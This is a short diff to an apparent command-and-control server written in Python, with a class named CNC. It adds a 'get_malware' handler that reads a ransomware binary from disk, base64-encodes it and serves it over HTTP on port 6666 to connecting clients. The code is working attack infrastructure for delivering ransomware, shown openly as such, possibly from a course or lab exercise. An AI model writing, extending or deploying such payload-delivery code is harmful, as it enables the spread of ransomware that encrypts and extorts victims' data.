@@ -119,6 +119,14 @@ class CNC(CNCBase):
             return {"valide": 1}
 
         return {"valide": 0}
+    
+    def get_malware(self, path:str, params:dict, body:dict)->dict:
+        payload = {}
+        path = CNC.ROOT_PATH + "bin/ransomware"
+        with open(path, "rb") as f:
+            payload["malware"] = self.bin_to_b64(f.read())
+        
+        return payload
 
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
 print("Httpd starting...")
